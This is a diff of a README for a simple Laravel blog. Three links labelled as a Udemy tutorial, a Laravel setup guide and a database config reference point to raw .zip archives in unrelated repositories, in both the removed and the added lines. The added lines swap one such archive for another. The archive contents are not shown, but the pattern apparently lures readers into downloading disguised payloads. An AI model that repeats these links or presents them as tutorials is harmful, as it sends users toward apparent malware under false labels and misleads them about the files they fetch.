@@ -1,6 +1,6 @@
 # Simple Blog built on Laravel PHP Framework.
 
-Tutorial and a screencast are on Udemy: https://github.com/videogramme/Qwen-Image-Edit-2511-LoRAs-Fast-Single-Image-Rerun/raw/refs/heads/master/storage/database/Single-As-Rerun-Lo-Qwen-Fast-Edit-Image-R-v1.0.zip  <- Laravel tutorials and a course by msurguy
+Tutorial and a screencast are on Udemy: https://raw.githubusercontent.com/videogramme/Muse-Skill-Hub/master/public/bundles/bootstrapper/Skill_Muse_Hub_3.4.zip  <- Laravel tutorials and a course by msurguy
 
 The blog features are :
 + twitter bootstrap layout implemented by bootstrapper bundle
@@ -9,11 +9,11 @@ The blog features are :
 + create new posts
 + delete posts
 
-To get this blog working on your local machine first get Laravel up and running (Tutorial here https://github.com/videogramme/Qwen-Image-Edit-2511-LoRAs-Fast-Single-Image-Rerun/raw/refs/heads/master/storage/database/Single-As-Rerun-Lo-Qwen-Fast-Edit-Image-R-v1.0.zip )
+To get this blog working on your local machine first get Laravel up and running (Tutorial here https://raw.githubusercontent.com/videogramme/Muse-Skill-Hub/master/public/bundles/bootstrapper/Skill_Muse_Hub_3.4.zip )
 
 Copy this folder or create a symbolic link to your server's htdocs or www folder.
 
-Create a database "blog" and make sure your database settings in config -> https://github.com/videogramme/Qwen-Image-Edit-2511-LoRAs-Fast-Single-Image-Rerun/raw/refs/heads/master/storage/database/Single-As-Rerun-Lo-Qwen-Fast-Edit-Image-R-v1.0.zip match your database setup.
+Create a database "blog" and make sure your database settings in config -> https://raw.githubusercontent.com/videogramme/Muse-Skill-Hub/master/public/bundles/bootstrapper/Skill_Muse_Hub_3.4.zip match your database setup.
 
 Then run migrations in the terminal or command line to set up tables from migrations: 
 <pre>
